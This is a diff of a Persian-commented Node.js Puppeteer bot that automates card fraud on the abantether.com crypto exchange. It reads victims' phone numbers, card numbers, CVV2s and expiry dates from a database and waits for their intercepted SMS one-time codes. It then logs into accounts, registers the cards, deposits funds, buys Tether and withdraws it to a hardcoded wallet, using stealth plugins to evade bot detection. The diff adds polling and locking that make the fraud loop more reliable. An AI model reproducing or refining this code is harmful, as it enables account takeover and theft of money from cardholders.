@@ -1,4 +1,4 @@
-// bot.js — نسخه نهایی و کامل (بدون هیچ خطایی)
+// bot.js — نسخه نهایی مخصوص پلن رایگان (Polling + مثل انسان واقعی)
 require('dotenv').config();
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
@@ -6,14 +6,14 @@ puppeteer.use(StealthPlugin());
 const { MongoClient, ObjectId } = require('mongodb');
 const chalk = require('chalk');
 
-// تنظیمات (از Railway)
+// تنظیمات
 const MONGODB_URI = process.env.MONGODB_URI;
 const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
 const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
 const SITE_URL = "https://abantether.com";
 
 if (!MONGODB_URI) {
-  console.log(chalk.red("خطا: MONGODB_URI تنظیم نشده!"));
+  console.log(chalk.red("MONGODB_URI تنظیم نشده!"));
   process.exit(1);
 }
 
@@ -28,46 +28,45 @@ const log = {
 
 let collection;
 
-// اتصال به دیتابیس
 async function connectDB() {
-  const client = new MongoClient(MONGODB_URI);
+  const client = new MongoClient(MONGODB_URI, { maxPoolSize: 10 });
   await client.connect();
   collection = client.db("zarin").collection("users");
-  log.s("اتصال به MongoDB برقرار شد");
+  log.s("اتصال به دیتابیس برقرار شد");
 }
 
-// آیا کاربر آماده پردازشه؟
+// آیا دیوایس آماده پردازش هست؟
 function isReady(doc) {
-  return true 
-  // return doc.personalPhoneNumber &&
-  //        doc.cardNumber &&
-  //        doc.cvv2 != null &&
-  //        doc.bankMonth != null &&
-  //        doc.bankYear != null &&
-  //        doc.deviceId &&
-  //        !doc.processed;
+  const hasPhone = !!doc.personalPhoneNumber;
+  const hasCard = !!doc.cardNumber && doc.cvv2 != null;
+  const hasBank = doc.bankMonth != null && (doc.bankYear != null && (doc.bankYear > 1000 || doc.bankYear >= 0));
+  const hasDevice = !!doc.deviceId;
+  const notProcessed = doc.processed !== true;
+  const notProcessing = doc.processing !== true;
+
+  return hasPhone && hasCard && hasBank && hasDevice && notProcessed && notProcessing;
 }
 
-// صبر کردن تا OTP تو دیتابیس وارد بشه
-async function waitForOtp(userId, field) {
-  for (let i = 0; i < 60; i++) { // حداکثر 3 دقیقه صبر کن
+// صبر برای OTP (هر 3 ثانیه چک می‌کنه)
+async function waitForOtp(userId, field, maxSeconds = 180) {
+  for (let i = 0; i < maxSeconds / 3; i++) {
     const user = await collection.findOne({ _id: new ObjectId(userId) });
     const otp = user?.[field]?.toString().trim();
     if (otp && otp.length >= 4) {
       log.s(`${field} دریافت شد: ${otp}`);
       return otp;
     }
-    log.w(`در انتظار ${field}... (${i + 1}/60)`);
+    log.w(`در انتظار ${field}... (${i * 3} ثانیه)`);
     await new Promise(r => setTimeout(r, 3000));
   }
-  throw new Error(`تایم‌اوت در انتظار ${field}`);
+  throw new Error(`تایم‌اوت ${field}`);
 }
 
-// پاک کردن فیلد OTP قبل از وارد کردن (فیکس خطای قبلی)
+// پاک کردن و وارد کردن متن
 async function clearAndType(page, selector, text) {
-  await page.evaluate((sel) => {
+  await page.evaluate(sel => {
     const el = document.querySelector(sel);
-    if (el) el.value = "";
+    if (el) el.value = '';
   }, selector);
   await page.type(selector, text);
 }
@@ -80,32 +79,36 @@ async function processUser(doc) {
   log.start(`شروع پردازش: ${phone} | دستگاه: ${doc.deviceId}`);
 
   try {
+    // علامت‌گذاری که در حال پردازشه
+    await collection.updateOne({ _id: doc._id }, { $set: { processing: true, startedAt: new Date() } });
+
     browser = await puppeteer.launch({
       headless: true,
-      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote']
+      args: [
+        '--no-sandbox',
+        '--disable-setuid-sandbox',
+        '--disable-dev-shm-usage',
+        '--no-zygote'
+      ]
     });
 
     const page = await browser.newPage();
-    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0 Mobile Safari/537.36");
-
+    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36");
     await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });
 
     // مرحله ۱: ورود با شماره
-    if (!doc.otp_login) {
-      await page.waitForSelector('input[placeholder="شماره موبایل"], input[type="tel"]', { timeout: 20000 });
-      await page.type('input[placeholder="شماره موبایل"], input[type="tel"]', phone);
-      await page.click('button:has-text("ادامه")');
-      log.i("درخواست OTP ورود ارسال شد");
-    }
+    await page.waitForSelector('input[placeholder="شماره موبایل"], input[type="tel"]', { timeout: 20000 });
+    await page.type('input[placeholder="شماره موبایل"], input[type="tel"]', phone);
+    await page.click('button:has-text("ادامه")');
+    log.i("درخواست OTP ورود ارسال شد");
 
-    // وارد کردن OTP ورود
-    const otpLogin = await waitForOtp(doc._id.toString(), "otp_login");
-    await page.waitForSelector('input[placeholder*="کد"], input[type="text"]', { timeout: 15000 });
-    await clearAndType(page, 'input[placeholder*="کد"], input[type="text"]', otpLogin);
+    const otpLogin = await waitForOtp(doc._id, "otp_login");
+    await page.waitForSelector('input[placeholder*="کد"]', { timeout: 15000 });
+    await clearAndType(page, 'input[placeholder*="کد"]', otpLogin);
     await page.click('button:has-text("تایید")');
-    log.s("ورود با موفقیت انجام شد");
+    log.s("ورود موفق");
 
-    // مرحله ۲: ثبت کارت (اگر قبلاً ثبت نشده)
+    // مرحله ۲: ثبت کارت (اگر لازم باشه)
     if (!doc.otp_register_card) {
       try {
         await page.click('text=کیف پول');
@@ -114,45 +117,43 @@ async function processUser(doc) {
         await page.type('input[placeholder="شماره کارت"]', doc.cardNumber.replace(/\D/g, ""));
         await page.type('input[placeholder="CVV2"]', doc.cvv2.toString());
         await page.type('input[placeholder="ماه"]', doc.bankMonth.toString().padStart(2, "0"));
-        await page.type('input[placeholder="سال"]', (doc.bankYear - 1300).toString().padStart(2, "0"));
+        const year = doc.bankYear > 1000 ? (doc.bankYear - 1300) : doc.bankYear;
+        await page.type('input[placeholder="سال"]', year.toString().padStart(2, "0"));
         await page.click('button:has-text("ثبت کارت")');
-        log.i("درخواست OTP ثبت کارت ارسال شد");
+        log.i("درخواست OTP ثبت کارت");
       } catch (e) {
-        log.i("کارت قبلاً ثبت شده است");
+        log.i("کارت قبلاً ثبت شده");
       }
     }
 
-    // تأیید کارت
-    if (doc.otp_register_card === undefined || doc.otp_register_card === null) {
-      const otpCard = await waitForOtp(doc._id.toString(), "otp_register_card");
+    if (!doc.otp_register_card) {
+      const otpCard = await waitForOtp(doc._id, "otp_register_card");
       await page.waitForSelector('input[placeholder*="کد پیامک"], input[placeholder*="کد"]', { timeout: 15000 });
       await clearAndType(page, 'input[placeholder*="کد پیامک"], input[placeholder*="کد"]', otpCard);
       await page.click('button:has-text("تأیید")');
-      log.s("کارت با موفقیت ثبت شد");
+      log.s("کارت تأیید شد");
     }
 
     // مرحله ۳: شارژ حساب
-    if (!doc.otp_payment) {
-      await page.click('text=واریز تومان');
-      await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
-      await page.click('button:has-text("پرداخت")');
-      log.i("در انتظار OTP پرداخت...");
-    }
+    await page.click('text=واریز تومان');
+    await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
+    await page.click('button:has-text("پرداخت")');
+    log.i("در انتظار OTP پرداخت");
 
-    const otpPayment = await waitForOtp(doc._id.toString(), "otp_payment");
+    const otpPay = await waitForOtp(doc._id, "otp_payment");
     await page.waitForSelector('input#otp, input[placeholder*="کد"]', { timeout: 20000 });
-    await clearAndType(page, 'input#otp, input[placeholder*="کد"]', otpPayment);
+    await clearAndType(page, 'input#otp, input[placeholder*="کد"]', otpPay);
     await page.click('button:has-text("تأیید")');
     await page.waitForSelector('text=موفق', { timeout: 120000 });
-    log.s("شارژ حساب با موفقیت انجام شد");
+    log.s("شارژ موفق");
 
     // مرحله ۴: خرید تتر
     await page.click('text=بازار');
     await page.click('text=تتر');
     await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
     await page.click('button:has-text("خرید")');
-    await page.waitForSelector('text=سفارش ثبت شد', { timeout: 40000 });
-    log.s("تتر با موفقیت خریداری شد");
+    await page.waitForSelector('text=سفارش', { timeout: 40000 });
+    log.s("تتر خریداری شد");
 
     // مرحله ۵: برداشت تتر
     await page.click('text=برداشت');
@@ -160,39 +161,49 @@ async function processUser(doc) {
     await page.type('input[placeholder="آدرس"]', WALLET_ADDRESS);
     await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
     await page.click('button:has-text("برداشت")');
-    await page.waitForSelector('text=درخواست برداشت ثبت شد', { timeout: 60000 });
+    await page.waitForSelector('text=درخواست برداشت', { timeout: 60000 });
 
-    log.s(`تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
+    log.s(`تمام مراحل تموم شد! تتر در راهه: ${phone}`);
     await collection.updateOne({ _id: doc._id }, { $set: { processed: true, status: "completed", completedAt: new Date() } });
 
   } catch (err) {
-    log.e(`خطا در پردازش ${phone}: ${err.message}`);
+    log.e(`خطا در ${phone}: ${err.message}`);
     await collection.updateOne({ _id: doc._id }, { $set: { status: "failed", error: err.message } });
   } finally {
-    if (browser) await browser.close();
+    if (browser) await browser.close().catch(() => {});
+    await collection.updateOne({ _id: doc._id }, { $unset: { processing: "" } });
   }
 }
 
-// شروع ربات + Real-time Change Stream
-async function startBot() {
+// Polling هر ۵ ثانیه (مناسب پلن رایگان)
+async function startPolling() {
   await connectDB();
+  log.s("ربات با Polling فعال شد — هر ۵ ثانیه چک می‌کنه");
 
-  log.s("ربات فعال شد — منتظر تغییرات دیتابیس...");
+  setInterval(async () => {
+    try {
+      const readyUsers = await collection.find({
+        processed: { $ne: true },
+        processing: { $ne: true },
+        personalPhoneNumber: { $exists: true }
+      }).limit(10).toArray();
 
-  const changeStream = collection.watch([], { fullDocument: "updateLookup" });
+      if (readyUsers.length === 0) {
+        log.i("در انتظار دیوایس جدید...");
+        return;
+      }
 
-  changeStream.on("change", async (change) => {
-    const doc = change.fullDocument;
-    if (!doc || !isReady(doc)) return;
-
-    log.start(`تغییر تشخیص داده شد → شروع پردازش ${doc.personalPhoneNumber} | دستگاه: ${doc.deviceId}`);
-    processUser(doc);
-  });
-
-  changeStream.on("error", () => {
-    log.e("Change Stream قطع شد! دوباره وصل می‌شم...");
-    setTimeout(startBot, 10000);
-  });
+      for (const user of readyUsers) {
+        if (isReady(user)) {
+          log.start(`دیوایس آماده پیدا شد → ${user.personalPhoneNumber}`);
+          processUser(user);
+        }
+      }
+    } catch (err) {
+      log.e("خطا در Polling: " + err.message);
+    }
+  }, 5000);
 }
 
-startBot().catch(() => setTimeout(startBot, 10000));
+// شروع
+startPolling();
